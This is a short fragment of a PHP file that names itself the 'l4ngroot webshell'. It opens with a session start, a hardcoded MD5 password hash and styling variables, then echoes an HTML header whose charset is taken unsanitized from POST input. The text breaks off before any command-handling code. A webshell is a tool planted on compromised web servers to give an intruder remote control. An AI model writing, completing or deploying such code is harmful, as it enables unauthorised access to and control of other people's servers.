<?php 
session_start();
$password = "8e3bf976813be9e9a1aea30886f1b6de";
$passtype = "MD5";
$color = "#df5";
...
global $color;
echo "<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=".$_POST['charset'] ."'><title>l4ngroot webshell</title>
<style>
